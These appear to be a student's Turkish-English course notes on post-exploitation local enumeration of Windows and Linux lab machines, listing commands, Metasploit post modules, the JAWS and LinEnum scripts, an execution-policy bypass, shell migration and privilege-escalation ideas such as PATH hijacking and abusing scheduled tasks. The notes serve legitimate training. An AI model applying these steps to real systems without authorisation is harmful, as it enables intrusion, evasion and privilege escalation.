## Post-Exploitation
+ Post-exploitation is the tactics, techniques and procedures that attackers/adversaries undertake after obtaining initial access on a target system.
+ In other words, post-exploitation involves what you do or have to do once you gain an <span style="background:#d4b106">initial foothold </span>on the target system.
##### Post-exploitation will differ based on the target operating system as well as the target infrastructure.

---
### The post-exploitation techniques you can run against the target will need to abide by the rules of engagement agreed upon with the client you are performing the pentest for.
## Note: 
##### When running post-exploitation techniques, you need to be sure that you have the necessary <span style="background:#d4b106">permissions and rights</span> to modify services, system configurations, perform privilege escalation, delete logs etc.
---
![[Pasted image 20240405120427.png]]



---
## Post-Exploitation Methodology

### In order to perform a thorough and complete post-exploitation phase, we need to utilize <span style="background:#d4b106">a structured methodology</span> that encompasses the most important stages of post-exploitation that can be applied during engagements.

## This structured, methodological approach ensures that we do not skip/overlook important phases of the post-exploitation phase in addition to providing us with trackable objectives based on each stage.

![[Pasted image 20240405120633.png]]
## BURADA EN ÖNEMLİ OLAN BİR SIRA DAHİLİNDE YAPABİLECEĞİMİZ HERŞEYİ TEK TEK KONTROL EDİP BİR STRUCTERED BİR CHECKLIST UZERINDEN HICBIRSEYI ATLAMADAN DEVAM ETMEK


 
### Bu 8 aşamalı  POST-EXPLOITATION METHODOLOGY de Pivoting aşamasından sonra kendini yenileyen bir dongu söz konusudur. A bilgisayarına ilk erişim sağladın ve buradan sonra diğer basamakları yaparak pivoting safhasına geldik.  Buradan sonra B makinesine erişim sağlar sağlamaz dongu tekrardan başlar.


---



![[Pasted image 20240405120651.png]]
![[Pasted image 20240405120712.png]]
![[Pasted image 20240405120729.png]]
![[Pasted image 20240405120743.png]]
![[Pasted image 20240405120808.png]]
![[Pasted image 20240405120824.png]]
![[Pasted image 20240405120834.png]]
![[Pasted image 20240405120847.png]]


---

## Windows Local Enumeration
#### #Windows-Local-Enumeration


### 1. Enumerating System Information

##### + What are we looking for?
##### + Hostname
##### + OS Name (Windows 7, 8 etc)
##### + OS Build & Service Pack (Windows 7 SP1 7600)
##### + OS Architecture (x64/x86)
##### + Installed updates/Hotfixes
![[Pasted image 20240405131804.png]]
### Buradaki bilgiler bize ne çeşit Exploitler kullanabiliriz bunu anlatır.

## Örneğin HOSTNAME -->> diyelimki host'un adı BOB. Biz şunu biliriz ki bu sistem BOB isminde bir kullanıcıya ait ve bu usernameyi biz heryerde kullanamaya çalışırız.

### OS 
##### 1. release 
##### 2. service pack 
##### 3. edition 
##### 4. version 
##### 5. build number
![[Pasted image 20240405131147.png]]
### Bu bilgiler yetki yükseltme bölümü için çok önemli. Hangi OS ve hangi sürümü gibi bilgilerle bunun priv esc zaafiyetlerini bulacağız.

## Hedefe yetkimizi yükseltecek bir dosya gödereceğiz ve dosya sadece x64 bitlik sistemlerde çalışıyor ve bizim hedefimiz 32 bitlik x86 bir sistemse bu exploit çalışmaz.
##### Veya ben kendim bir msfvenom ile bir payload yazıyorsam architecture yanlışsa bu payload çöp.

---
### Installed updates/Hotfixes : Bunları tespit etmek bizim bulduğumuz bilgiler ışığında yapacağımız attack vektöründeki zaafiyetlerin patch'lenip patch'lenmediğini yamalanıp yamalanmadığını bulmak için gereklidir.

--- 

## Enumerating System Information LAB

### rejettoyu kullandık.
![[Pasted image 20240405132642.png]]

---
### getuid
### sysinfo

![[Pasted image 20240405132741.png]]
##### Hostname direk isim olarak verilmiş burada. 
![[Pasted image 20240405132851.png]]
###### Öğretmenin verdiği örnek de verilmemiş örneğin

---

## Windows Commands For Enum

### 1. hostname
![[Pasted image 20240405133115.png]]
## 2. systeminfo
![[Pasted image 20240405133222.png]]
![[Pasted image 20240405133249.png]]
### Bu systeminfo ayrıca hotfixes'ları / updates'leri de gösterir.
![[Pasted image 20240405133424.png]]
![[Pasted image 20240405133515.png]]
## ram kapasitesi
![[Pasted image 20240405133640.png]]

### hotfix
![[Pasted image 20240405133735.png]]
##### Buradaki hotfix'lerin ne olduğunu neden dolayı yüklendiğini google'layarak öğrenebilirsin.

### Pivoting için Network bilgileri önemli
![[Pasted image 20240405133909.png]]

## hotfix için diğer komutlar #hotfix

![[Pasted image 20240405134101.png]]
##### wmic qfe get Caption,Description,HotFixID,InstalledOn
![[Pasted image 20240405134303.png]]
![[Pasted image 20240405134330.png]]
### Hotfix veya update'leri linki ile birlikte verir.
## Security Updates bizi daha çok ilgilendiriyor.

---
### eula.txt
![[Pasted image 20240405134714.png]]

### Windows'un hangi versiyon olduğu yazar


---
## 2. Enumerating Users & Groups

+ After gaining initial access to a target system, it is always important to learn more about the system like, what <span style="background:#d4b106">user account you have access to and other user accounts on the system.</span>

### <span style="background:#d4b106"> What are we looking for?</span>
<span style="background:#d4b106">+ Current user & privileges</span>
<span style="background:#d4b106">+ Additional user information</span>
<span style="background:#40a9ff">Password Policy - Password Age - (Password Expire Time)</span>

<span style="background:#d4b106">+ Other users on the system</span>
<span style="background:#d4b106">+ Groups</span>
<span style="background:#d4b106">+ Members of the built-in administrator group</span>

---
## Her bulduğumuz grubun ismi yetkisi önemli. Çünkü çok önemsiz gibi gözüken bir group yetkisi bizi NT / Auth olmamızı sağlayabilir.
### Bu neden öenmli --->> Senin yetkilerin be dahil olduğun gruplar priv esca bolumunde lazım olacak ve bu yetkilerle neler yapabileceğimizi bulmalıyız.

##### Bunun dışında pivoting yaparken başka kullanıcıların yetkilerini kullanmamız gerektiğinde hangi kullanıcılar var bunlar bilmek çok önemli.

## Normal standart kullanıcıysan ve hiçbir yetkin yoksa attack vektörü buna göre şekillenir.  Local Admin Group daysan buna ayrı özel şekillenir attack vektörü.
### Nihai olarak benim hedefim NT / Authority yetkisini almaktır.

#### Ben sisteme girmişim yetkilerimi bilmiyorum. Belki kullandığım zaafiyet sömürüsü beni direk NT /Authority olarak sisteme erişim sağlattı ancak ben hala priv esca üzerine gerek olmadan çalışıyorum. Mantıksız. Hedef hakkında her bilgi altın değerindedir. Sadece kullanacağın zaman ve şartlar değişir ama kullanırsın mutlaka bir durum ve şart ve zamanda.

---

## Örnek Senaryo:
##### Biz hedef sisteme BOB standart yetkisiz kullanıcı olarak giriş yaptık. Daha sonra Sistemde Local Group Admin olarak yetkisi olan ALICE kullanıcısını tespit ettik. Biz potentially bu ALICE kullanıcısına erişmeye çalışırız ki Local Admin Group'a dahil olalım.

---

## LAB - Enumerating Users & Groups
### 1. getuid
![[Pasted image 20240406033031.png]]

### 2. getprivs
![[Pasted image 20240406033142.png]]
##### Entire GAMUT (baştan sona herşey) of Privileges

### 3. Daha Önce LOG ON Olmuş Kullanıcılar.
##### Bulunduğumuz session'dan background yaptık. search --> logged_on yazdık ve 

##### post(windows/gather/enum_logged_on_users
![[Pasted image 20240406033745.png]]
![[Pasted image 20240406033548.png]]

### Shell ile devam ediyoruz.

### 4. whoami
![[Pasted image 20240406034017.png]]

### 5. whoami /priv
![[Pasted image 20240406034139.png]]

### 6. query user

![[Pasted image 20240406034727.png]]
##### Burada Logged on Time çok önemli. Sen erişim sağladığın esnada sisteme log on olan kullanıcılar senin yakalanmana sabep verebilirler. Kim o esnada logged on olduğunu bilmek yakalanma riskini analiz etmeni sağlar.

### 7.  net user
![[Pasted image 20240406035038.png]]
## <span style="background:#40a9ff">net user</span> bize sistemdeki diğer account 'ları kullanıcıları  görmemizi sağlar

### 8. net user administrator
![[Pasted image 20240406035247.png]]
### Bir kullanıcı hakkında özelikle bir bilgi öğrenmek istediğinde kullanılacak ve tek tek account bilgileri toplanabilir.                          net user onur123
![[Pasted image 20240406035402.png]]

## Log on Hours Önemli
### Bir şirketteki güvenlik politikası gereği sadece mesai saatelerinde log on olması gereken kullanıcılar olabilir. Siz bu user'ların account'larına eğer o zaman dilimi dışında erişmeye çalışırsanız credentials bile elinde olsa sistem alarm verecektir. Buna dikkat.......
![[Pasted image 20240406035623.png]]

### 9. net user guest
![[Pasted image 20240406040008.png]]
### Bu sistemde guest account active : NO olduğunu gördük. Guest account disabled edilmiş. 

### 10. net localgroup
![[Pasted image 20240406040721.png]]
### Burada her bir grubun farklı yetkileri var örneğin Remote Desktop Group üyesi ise bizim erişim sağladığımız user bunu direk kullanmak için attack vektörü listemize alabiliriz. 

##### Standart *Users group örneğin genelde hiç yetkisi olmayan grouptur.

### 11. Her Group Hakkında detaylı bilgiyi bulmak önemli .--->> 
![[Pasted image 20240406041501.png]]
## Bu gruba kimler dahil bunu bilmek çok önemli buna göre hedef belirlenebilir. Yetkisi olamayan kullanıcay saldırıp ne yapacağım mantık olarak eğer başka bir kazanımı yoksa tabiki...


---
---
## 3. Enumerating Network Information

### What are we looking for?
<span style="background:#d4b106">+ Current IP address & network adapter</span>
##### Burada gateway öğrebmek de önemli-->> Başka hostları bulmamız için son derece önemli.

<span style="background:#d4b106">+ Internal networks</span>
##### Bunlara publicly ulaşamadığımız için internal network tespiti başarılı bir pentestte bize çok kazanım sağlayabilir. PIVOTING

<span style="background:#d3f8b6">+ TCP/UDP services running and their respective ports</span>

<span style="background:#d4b106">+ Other hosts on the network</span>

<span style="background:#d4b106">+ Routing table</span>

<span style="background:#ff4d4f">+ Windows Firewall state</span>


---
### 1. ipconfig
![[Pasted image 20240406225850.png]]
### Burada ipconfig bize sisteme bağlı network adapter'leri yazar. Bu sayede başka internal veya external ağa dahil mi değil mi anlayabilriz.
## Subnet mask ile sistemde olabilecek maximum host sayısını anlayabiliriz.
### Default gateway ise sistemdeki veri akışını sağlayan router'ın IP adresidir basit olarak düşünecek olursak.



##### Ayrıca Tunnel Adapter verilerini de gösterir bize ipconfig. Burası AWS için spesifiktir. 

### ipconfig /all
![[Pasted image 20240406230527.png]]
##### Burası bize windows ip configuratin'u gösteriyor. HOSTNAME etc. 



### ethernet 2 
![[Pasted image 20240406230837.png]]
##### DHCP'nin enabled olduğu yani IP'lerin otomatik olarak DHCP server tarafından atandığını gösterir. 
# Ve bu da şu demektir. Bu network de IP adresleri static değil yani muhtemelen değişebilir.

## Ne zaman DHCP enabled bir network'e dahil olsan sana lease IP adres sağlanır. 

![[Pasted image 20240406230551.png]]

![[Pasted image 20240406231352.png]]
### Küçük networklerde buna genellikle karşılaşılır.

### DNS Server
![[Pasted image 20240406231536.png]]
##### Burada DNS server'ın da çalıştığını öğreniyoruz.

## Alexis Ahmedin Labının sonuçlarına göre çalışan eth 2 diyew başka bir adapter var ve bizim buraya public erişimimiz yok. Biz buraya Pivoting yapacağız ve route'umuza burayı ekleyip buradaki service'ler ve pentestte uyguladığımız butun enum işlemlerini yapacağız.

---

### Routing TABLE

## route print
![[Pasted image 20240406232203.png]]

![[Pasted image 20240406232223.png]]


----

### Networkdeki bütün device'ları bulma ne var  ne yok
## arp -a
![[Pasted image 20240406232500.png]]
![[Pasted image 20240406232720.png]]
### pivoting yapmak için Alexis Ahmedin networkunde 169.254.169.254 numaralı yeni bir network tespit ettik.


---

## netstat -ano

##### Açık portlar, bağlantılar, port'larda çalışan service'leri görmek istiyorsan netstat ano




![[Pasted image 20240406233216.png]]
![[Pasted image 20240406233156.png]]

![[Pasted image 20240406233404.png]]
### port 80 http - port 445 Smb 3389 RDP gibi hangi portlar açık ve bağlantıda belli

![[Pasted image 20240406233654.png]]
![[Pasted image 20240406233709.png]]

### Kendi sistemimizi analiz ederken böyle alakasız bir servicenin bizim port 4444 de çalıştığını gördük Saldırı altında olduğumuz anlamına gelebilir

---
# Windows Firewall is DISPLAYED

![[Pasted image 20240406234535.png]]

## <span style="background:#ff4d4f">Important</span>
![[Pasted image 20240406234731.png]]
### netsh advfirewall firewall


---
---

## Enumerating Processes & Services

+ After gaining initial access to a target system, it is always important to learn more about the system like, what processes, services and scheduled tasks are currently running.
### What are we looking for?
+ Running processes & services
+ Scheduled tasks
## ➔ A process is an instance of a running executable (.exe) or program. Desktop ile etkileşimi var. <span style="background:#ff4d4f">google Chrome örneğin</span>
### ➔ A service is a process which runs in the background and <span style="background:#ff4d4f">does not interact with the desktop</span>.
### Etkileşim yok sadece arka planda çalışır.
![[Pasted image 20240411140754.png]]

---
# Process -->> Kullanılan Standart Desktop ile etkileşimli progrmlardır.
## Precess 'leri öğrenmemiz hangi  precess'e migrate edeceğiz bundan dolayı önemli. Daha stabili yakalanması daha zor -->> örneğin explorer.exe'yi migrate ettiğin zatan daha stabil bir shell ile devam edersin. 
### Explorer.exe 'nin  <span style="background:#ff4d4f">PROCESS ID</span> 'sini bulman gerekir ki buraya migrate edebilmen için. 

---
# Scheduled TASK
## Ayrıca scheduled task'i enumerate etmen önemli çünkü bunların config dosyalarını değiştirebilirsen veya yaptığı işleme müdahil olabilirsen bunu exploit edebilirsin. 

---

## Enumeration Commands
## 1. ps
![[Pasted image 20240411141020.png]]

### Burada USer column cok önemli. Çünkü eğer bir process'i NT / Auth çalıştırıyor ve sen ona migrate yapabiliyorsan karşı tarafa geçmiş olsun.

##### Burada şöyle bir uyarı yapalım. Biz diyelim ki BOB user ile shell aldık ve ps çalıştırdık. Burada Bütün NT / Auth olanları göremeyebiliriz.

#### Diğer önemli bir bilgi de process'in PATH 'inin nerede olduğudur. ' Bu precess'in config dosyasına bir mudahele yepebileceksek yerini bilmeliyiz.

---
### pgrep explorer
### porecess-id-bulma
#porecess-id-bulma

![[Pasted image 20240411141144.png]]
![[Pasted image 20240411141922.png]]

# Taviye
## Ne zaman meterpreter shell alırsan explorer.exe'ye migrate etmek önemlidir. Çünkü shell stabil olur ve explorer.exe çok nadiren durdurulur. 

### Ayrıca bşz x64 process'e migrate edersek bizim shell'imiz de x64 olur.

---

### Normal Shell İle Enum
![[Pasted image 20240411142412.png]]

# Başlamış Started Service 'lerin Listesi için

### 1. net start   ----Bunlar SErvice'lerdir Process'ler değil

##### Yani Bunlar arka planda çalışanlar
![[Pasted image 20240411142547.png]]

### wmic service list brief
![[Pasted image 20240411143052.png]]
![[Pasted image 20240411143158.png]]






### 2.    tasklist /SVC --->Process'ler

![[Pasted image 20240411143341.png]]
![[Pasted image 20240411143426.png]]

### Örnek ![[Pasted image 20240411143507.png]]
##### lsass.exe process'inin altında çalışan

---
### Scheduled Task -->> Zamanlanmış Görevleri bulmak önemli eğer ben bunları manüple edebilirsem NT /Auth yetkisi alabilirim.

## schtasks /query /fo LIST
![[Pasted image 20240414230719.png]]

## C:\Windows\system32>schtasks /query /fo LIST /v
 ![[Pasted image 20240414231133.png]]

# Bu bilgi neden önemli ?
##### Bazı durumlarda Scheduled Task Misconfigured yanlış configure edilmiş olacağı için hedef sistemi zaafiyetli hale dönüştürüyor. 
## Burada Bizim özellikle dikkat etmemiz gereken NT / Authority tarafından yürütülen scheduled task'lere bakmalıyız ki buradan kazanç sağlayabilelim. 

### Bu task zaten NT /  Auth yetkisiyle yürütülüyor. Misconfig'den dolayı biz de buna bir Malicious Code Execute ettirebilirsek bu da bize NT /  Auth Yetkisiyle çalıştırıldığı için NT / Auth yetkisi almamıza yarayacaktır.

---

## Automating Windows Local Enumeration
#windows-msfconsole
#windows-enum-msfconsole

##### While local enumeration techniques/commands are important to know, 
## as a penetration tester, <span style="background:#ff4d4f">you will need to be time efficient.</span> 
##### As a result, you will need to learn how to utilize various automated enumeration scripts.

#### In addition to automating the process of enumerating information like system information, users & groups etc, these automated enumeration scripts will also provide you with additional information regarding the target system like; <span style="background:#d4b106">privilege escalation vulnerabilities, locally stored passwords etc.</span>

---

## #JAWS #windows-enum  
### Just Another Windows (Enum) Script
##### JAWS - Just Another Windows (Enum) Script - JAWS is PowerShell script designed to help penetration testers (and CTFers) quickly identify potential privilege escalation vectors on Windows systems. It is written using<span style="background:#40a9ff"> PowerShell 2.0 so 'should' run on every Windows version</span> <span style="background:#d4b106">since Windows 7.</span>

##### GitHub Repo: https://github.com/411Hall/JAWS
![[Pasted image 20240414232522.png]]
#### #windows-Privilege-Escalation #JAWS 


### Biz hedef olarak kendimize win10 belirledik ve port 445 'de olan  eternalblue açığını kullanarak hedef sisteme girdik.

## Alexis Ahmed hedefe #winrm açığını kullanarak girdi. crendentials'ı verdi ve 
![[Pasted image 20240415010859.png]]
### FORCE_VBS true hale getirdi.
## İlk denemede olmayabilir 2-3 denemede olabilir.


---

## Enum Devam 
### 1. meterpreter> show_mount
![[Pasted image 20240415012447.png]]

### 2. win_privs
##### meterpreter background'a alınarak yapılır. search win_privs
![[Pasted image 20240415012717.png]]
![[Pasted image 20240415012733.png]]
### getprivs yaptığı işleme benziyor biraz daha ayrıntılı.


----

## 3. enum_logged
![[Pasted image 20240415013807.png]]
##### Bunlardan en sondaki user olarak logged on 'dur. Geri kalanlar localService ve sistem profili logged on 'un olarak değerlendirilir. Bize user lazım.

---

### 4. search checkvm    
#### <span style="background:#d4b106">Bu şundan dolayı önemli hedef sistem bir VM mi yoksa normal bir server veya makine mi bunu anlamamıza yarar.</span> 
![[Pasted image 20240415014236.png]]
## windows olanı seçtik ve bize virtual box VM olduğunu verdi.


---

## Hedefteki yüklenen programlar

### search enum_applications
![[Pasted image 20240415014725.png]]

### Spesipik olarak yüklenmiş programlarda eğer bir zaafiyet varsa bunu kullanmak için bunları enumerate ediyoruz.


---

## Network'de bağlı olunan diğer computer'ları bulmak
### search enum_computers

![[Pasted image 20240415015335.png]]
### Bu pivoting için gerekli olan enumeration'dur

---

## Hedefe tüklenen update'ler PATCH'ler ve yamalar

### search enum_patches
![[Pasted image 20240415015534.png]]

---
## enum shares module

### search enum_shares
![[Pasted image 20240415015759.png]]

---
### Github - #JAWS 
![[Pasted image 20240415124447.png]]
### Yukarıdaki listedekileri enumeration yapıyor.
- Network Information (interfaces, arp, netstat)
- Firewall Status and Rules
- Running Processes
- Files and Folders with Full Control or Modify Access
- Mapped Drives
- Potentially Interesting Files
- Unquoted Service Paths
- Recent Documents
- System Install Files
- AlwaysInstallElevated Registry Key Check
- Stored Credentials
- Installed Applications
- Potentially Vulnerable Services
- MuiCache Files
- Scheduled Tasks
---
## #JAWS Bunu biz github.dan aldık eJPT klasörü içine hem directory hemde normal dosya olarak kaydettik.


# ÖNEMLİ UYARI - TEMP 
### HEDEF bilgisayara ne upload edeceksen her zaman TEMP klasörüne at ki hem upload ettiklerini kolay bulursun hem de by default bu Temp klasörüne birşeyler atmaya izin vardır.

## Eğer Temp Klasörü Mevcut değilse bunu mkdir ile oluşturmalısın

![[Pasted image 20240415130317.png]]

# Windows User'lara by default POWERSHELL SCRIPT çalıştırmaya izin vermez.

##### Yoksa biz direk powershell.exe jaws-enum.ps1 diye çalıştırırdık. 
## Bu yüzden biz EXECUTION POLICY oluşturman gerekir.

![[Pasted image 20240415130702.png]]
### C:/Temp>powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum2.txt

##### Burada şunu söylüyoruz. Ben jaws-enum.ps1 powershell script'i çalıştırmak istiyorum powershell ile ve  bunu da ismini verdiğim dosyaya kaydedilmesini istiyorum.

##  Bunu yapmamızın sebebi -->> bu script bize bir sürü bilgi sunacak ve bunun terminalde satırlarca yazılması mantıksız. 
### Bu çıktıyı biz analiz ederek detaylı bakarak kullanacağız.

![[Pasted image 20240415132626.png]]
### meterpreter shell ile tekrar kendi kali'mize sonucu çektik ve analiz ediyoruz.

![[Pasted image 20240415134156.png]]

![[Pasted image 20240415134247.png]]
![[Pasted image 20240415134302.png]]
![[Pasted image 20240415134407.png]]
![[Pasted image 20240415134438.png]]
![[Pasted image 20240415134550.png]]

### Modify edebileceğin dosyalar listesi çok önemli. Bunları manüple ederek belkide yetki yükselteceğiz.

![[Pasted image 20240415134705.png]]


---
---
----

# Linux Local Enumeration
### #linux-enum 

## 1. Enumerating System Information
![[Pasted image 20240415185803.png]]
### What are we looking for?
+ Hostname
##### + Distribution & distribution release version
##### Bütün linux distro'larının package manager'ları farklıdır. örneğin Debian tabanlı UBUNTU'nun <span style="background:#d4b106">apt</span> 'dir ve komut çalıştırırken sudo apt-get install diye başlar.
### Veya Arch Linux hedefe bşr saldırı düzenliyorsak bunun package manager'i <span style="background:#d4b106">pacman</span> <span style="background:#d4b106">packet manager</span> 'dir. 

## Hangi distro olduğu önemli ve ayrıca hangi distronun hangi release version olduğu da çok önemli ki attack vector bu enumeration verisine göre şekillendirilir.
![[Pasted image 20240415185053.png]]


### + Kernel version & architecture
##### Yetki yükseltmede hangi kernel versionunu bakmak gerekir.
![[Pasted image 20240415185729.png]]
![[Pasted image 20240415185858.png]]

+ CPU information
+ Disk information & mounted drives
+ Installed packages/software


## Ana Mantık şu : Ben hedef sisteme standart kullanıcı olarak var olan bir exploiti kullanarak veya social engineering ile erişim sağladım. Bundan sonra herşeye baştan başlayıp detaylı bir enumeration yapmak ve yetki yükseltme için ne yapabilirim bunu belirlemek için bilgileri toparlmak önemli. 
### Sırasıyla yukarıdaki bilgileri tespit edeceğiz ve sonra KERNEL version'da bir priv esc durumu varsa bunu kullanacağız ya da installed packages varsa bunlarda böyle bir durum varsa bunlara bakacağız.

---
## vsftpd 2.3.4  exploit kullanarak shell aldık bunu. CTRL + Z              session  -u ile upgrade ettik ve meterpreter shell'e çevirdik
![[Pasted image 20240415191432.png]]

---

### 1. sysinfo
![[Pasted image 20240415191724.png]]
### <span style="background:#d4b106">Kernel Verision : Linux 2.6.24-16-server</span>

### Manuel shell
![[Pasted image 20240415191946.png]]

---
### 2. hostname

![[Pasted image 20240415195654.png]]
### 3. cat /etc/issue
![[Pasted image 20240415195621.png]]

### 4. <span style="background:#d4b106">cat /etc/*release</span>
##### wild card kullanarak release istemi yaparsan daha ayrıntılı verir bilgiyi.
![[Pasted image 20240415195837.png]]

### 5. uname -a

![[Pasted image 20240415200022.png]]
### <span style="background:#d4b106">hostname</span> -> metasploitable
### <span style="background:#d4b106">kernel version</span> -> 2.6.24.-16-server
### <span style="background:#d4b106">date and time</span> ->Apr 10 13:58:00
### <span style="background:#d4b106">kernel architecture</span> -> i686GNU/Linux
![[Pasted image 20240415200337.png]]

### 6. uname -r
##### kernel versionu verir.
![[Pasted image 20240415200438.png]]

---

### 7. env
![[Pasted image 20240415200608.png]]
![[Pasted image 20240415200641.png]]

### #env komutu bizim bir tool'un default olarak PATH'ine nereye bakılacağını gösterir.

### Örneğin biz "cat" komutunu yazdığımızda linux #env da yazılı olan directory'lere sırasıyla bakar. 
![[Pasted image 20240415200908.png]]
##### Linux cat yazınca /usr/local/sbin   directory'sine bakar ve burada eğer cat varsa bunu çalıştırır.
## #env değişkenini manüplasyon için çok kullanırız. Hedef sistem içindeki bir programın aynı isminde olan başka bir programı temp içine malicious olarak yazarız ve env variable 'a Temp klasörünü ekledik mi sistem gider asıl programı çalıştıracağına bizimkini çalıştırır.  

---

### 8. lscpu
##### CPU hakkında bilgi toplamak için kullanılır.
![[Pasted image 20240415201900.png]]
![[Pasted image 20240415201952.png]]
![[Pasted image 20240415202022.png]]
![[Pasted image 20240415202142.png]]
![[Pasted image 20240415202238.png]]

---
### 9. free -h   --- ne kadar ram kullanılıyor.
### free -t


![[Pasted image 20240415202332.png]]
![[Pasted image 20240415202509.png]]

### 10. df -h
![[Pasted image 20240415202612.png]]
![[Pasted image 20240415202735.png]]
![[Pasted image 20240415202807.png]]

### 11. df -ht ext4
![[Pasted image 20240415202938.png]]
## bu dev/sda1    klasörü windows daki C: klasörüne denk gelir ve temel linux buraya yüklenmiştir.


### lsblk | grep sd
### display disk info

![[Pasted image 20240415215854.png]]
![[Pasted image 20240415215952.png]]

![[Pasted image 20240415220038.png]]

---
## Debian Package Management Utility
### 12. dpkg -l

![[Pasted image 20240415220225.png]]
![[Pasted image 20240415220306.png]]
### Yüklenmiş paketleri gösterir.

## Bu bilgi neden önemli ?
### Şimdi spesifik bir program versiyonunu biz yetki yükseltmede kullanabiliriz. 
![[Pasted image 20240415220436.png]]
##### Örnek bash 'in belirli versiyonlarında zaafiyet var ve bunu priv esc'de kullanabiliriz.

---

## 2. Enumerating Users & Groups - Linux


![[Pasted image 20240415221152.png]]

### What are we looking for?
+ Current user & privileges
+ Other users on the system
+ Groups

---

### 1. getuid
![[Pasted image 20240415221608.png]]
##### Linux da her zaman 0 numaralı user root'a ayrılmıştır.

### 2. whoami
![[Pasted image 20240415221734.png]]

### groups root
### groups bob
### groups onur
![[Pasted image 20240415222056.png]]

## Kullanıcıların hangi gruba dahil olduğunu bilirsek lateral movement yapacaksak veya user'dan user'a atlayacaksak doğru kişiye atlarız.

---

### 4. cat /etc/passwd
## diğer kullanıcılar kimler ?
![[Pasted image 20240415222350.png]]
### Şimdi burada bir ayırt etme işlemi yapmak zorundayız. User ACCOUNT ile Service Account ayırt edilmesi gerekir. 
## Son bolumunde shell ismi olanlar user accounttur
![[Pasted image 20240415222546.png]]
![[Pasted image 20240415222601.png]]
##### Service account bir servisi yönetmek üzere olan process'i sona yazar user ise shell ile işlem göreceği için ya /bin/bash  yazar ya da /bin/sh   yazar.

# Çok Önemli
### Bu user account dışındakileri exclude etmek istiyorsan grep'liyeceksin ve -v kullanacaksın
![[Pasted image 20240415222855.png]]
##### cat /etc/passwd | grep -v /nologin 
![[Pasted image 20240415223000.png]]
![[Pasted image 20240415223033.png]]

### id

![[Pasted image 20240416135308.png]]


----


### <span style="background:#d4b106">root</span> : x : <span style="background:#40a9ff">0 </span>: <span style="background:#ff4d4f">0 </span>: <span style="background:#d2cbff">root</span> : <span style="background:rgba(255, 183, 139, 0.55)">/ root</span> : /bin/bash

### root : user
### 0 : user ID (root)
### 0: group ID (root) 
### /root : home directory 

## Linux Kullanıcı Ekleme
### useradd bob -s /bin/bash
![[Pasted image 20240415223758.png]]
##### Yukarıdaki komutla kullancı oluşturduğunda home directory de user klasörü oluşturulmuyor

### useradd -m john -s /bin/bash
![[Pasted image 20240415224208.png]]

![[Pasted image 20240415224058.png]]


---
### Bir kullanıcıyı bir group'a dahil etme
## john kullanıcısı root grubuna dahil edildi.
##### usermod -aG root john

![[Pasted image 20240415230313.png]]



---

### groups
![[Pasted image 20240415230047.png]]



---
## Şuan Logged On User'ları Listeleme

### w    --->>> "w " komutu logged on'ları gösterir
![[Pasted image 20240415230532.png]]

## who     bu da aynısını yapar
![[Pasted image 20240415230622.png]]
![[Pasted image 20240415230642.png]]


---

### last
![[Pasted image 20240415230919.png]]
##### en son logged on olmuş kullanıcıları göstermesi için
### Burada şuna dikkat etmek lazım biz root olarak sisteme eriştik ama last komutunda gözükmüyoruz. Çünkü SSH yoluyla uzaktan veya TTY yoluyla fiziksel olarak authenticate olmuş kullanıcıları sadece gösterir bu komut.

---

## lastlog
![[Pasted image 20240415231054.png]]
### en son logged on olan kullanıcılar.




---

## 3. Enumerating Network Information

![[Pasted image 20240415230128.png]]

### ifconfig
![[Pasted image 20240415231553.png]]
### lo  : interface 1 deki linux da default'tur ve local host'u oluşturur. 127.0.0.1
## local service'ler kullanması için var

---

### 2. netstat

![[Pasted image 20240415232008.png]]
![[Pasted image 20240415232052.png]]


![[Pasted image 20240415232141.png]]

### kendi meterpreter shell nerde acaba netstat de
![[Pasted image 20240415232306.png]]

![[Pasted image 20240415232406.png]]

## netstat komutu TCP / UDP portlarının nelerdi dinlediğin açık/kapalı olam durumunu gösterir.


---

## 5. route
![[Pasted image 20240415232555.png]]
##### route komutun da bizim gateway'e dikkat etmeliyiz. 

---

### Manual --- Shell
##### ifconfig
![[Pasted image 20240415232822.png]]

### ip a s
![[Pasted image 20240415232905.png]]

---

## cat /etc/networks

![[Pasted image 20240415233118.png]]
![[Pasted image 20240415233131.png]]

![[Pasted image 20240415233242.png]]

### cat /etc/hostname
### cat /etc/hosts


---
### cat /etc/resolv.conf

![[Pasted image 20240415233420.png]]

![[Pasted image 20240415233459.png]]

---

### arp -a
![[Pasted image 20240415233654.png]]


-------------------------------------------


### 4. Enumerating Processes & Cron Jobs

![[Pasted image 20240415234018.png]]
![[Pasted image 20240416124925.png]]
![[Pasted image 20240416125042.png]]

### 1. ps
![[Pasted image 20240416125005.png]]


### 2. pgrep --->> belirli process bulur
![[Pasted image 20240416125216.png]]

---

## shell --->> Manual

### 1. ps   /   ps aux
![[Pasted image 20240416125413.png]]
### ps aux

![[Pasted image 20240416125439.png]]

## ps aux | grep msfconsole
![[Pasted image 20240416125903.png]]

---
### ps aux | grep root
##### root kullanıcısının çalıştırdığı process'ler
![[Pasted image 20240416130004.png]]


### 1. top   ---- #top  bu çalışan ps'lerin listesini gösterir
![[Pasted image 20240416130217.png]]


---

## Cron Jobs  #cronjob 

### 1. crontab -l     ---->> belli kullanıcı için crontab'leri gösterir.
![[Pasted image 20240416130530.png]]


### 2. cat /etc/cron*
![[Pasted image 20240416130828.png]]

### ls -la /etc/cron*
![[Pasted image 20240416130922.png]]
### ls -la /etc/cron*
![[Pasted image 20240416131043.png]]

---


## 5. Automating Linux Local Enumeration
#linux-enum-auto

##### GitHub Repo: https://github.com/rebootuser/LinEnum


---

### meterpreter modules 
##### Öğretmen #shellshock-cgi  ile erişim sağladı. 

### enum_configs
![[Pasted image 20240416133116.png]]
![[Pasted image 20240416133210.png]]

### Bu module bütün config dosyalarını bize bulur.
## Örneğin hedef sistem de hangi shell'ler var buradan öğrenebiliriz.
![[Pasted image 20240416133433.png]]
![[Pasted image 20240416133509.png]]

---

### enum_network
![[Pasted image 20240416133621.png]]
![[Pasted image 20240416133640.png]]
### yine bütün network'ü buradan öğrenebiliriz.
![[Pasted image 20240416133755.png]]
## listening ports
![[Pasted image 20240416133847.png]]

---

### enum_system
![[Pasted image 20240416134019.png]]
![[Pasted image 20240416134046.png]]
## stored packages
![[Pasted image 20240416134137.png]]

---
### checkvm
![[Pasted image 20240416134237.png]]

![[Pasted image 20240416134302.png]]

---
## Linux Local Enum Scripts

##### GitHub Repo: https://github.com/rebootuser/LinEnum
![[Pasted image 20240416134407.png]]

![[Pasted image 20240416134604.png]]
![[Pasted image 20240416134625.png]]
